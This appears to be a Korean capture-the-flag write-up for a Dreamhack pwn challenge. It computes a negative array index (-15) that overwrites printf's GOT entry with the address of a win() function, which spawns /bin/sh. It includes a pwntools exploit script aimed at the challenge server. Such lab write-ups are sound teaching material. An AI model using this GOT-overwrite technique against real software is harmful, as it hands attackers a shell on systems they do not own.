![Image](/assets/img/p_rho/image1.png)

![Image](/assets/img/p_rho/image2.png)

printf@GOT = 0x404008

buf 시작 주소 = 0x404080

![Image](/assets/img/p_rho/image3.png)

![Image](/assets/img/p_rho/image4.png)

buf         = 0x404080
printf@GOT  = 0x404008

차이: 0x404080 - 0x404008 = 0x78 = 120 bytes

배열 인덱싱은 타입 크기 단위로 계산됨

buf[0]의 타입은 unsigned long

x86_64 시스템에서 sizeof(unsigned long) = 8

그러므로 buf[i]는 실제로 buf + (i * 8)만큼 떨어진 주소에 접근함

따라서  오프셋으로 쓰려면 덮고 싶은 바이트 오프셋 / 8해서 인덱스를 계산해야 함 

```c
unsigned __int64 win()
{
  char *argv[3]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  argv[0] = "/bin/sh";
  argv[1] = 0;
  execve("/bin/sh", argv, 0);
  return v2 - __readfsqword(0x28u);
}
```

내부에 win 함수가 있으므로 win함수로 덮어주면 된다.

주소는 4011b6

![Image](/assets/img/p_rho/image5.png)

---

exploit.py

```c
from pwn import *

#p = process("./prob")
p =  remote("host3.dreamhack.games",18578)

p.sendlineafter(b"val: ",b"-15")
p.sendlineafter(b"val: ",str(0x00000000004011B6).encode('ascii'))

p.interactive()
```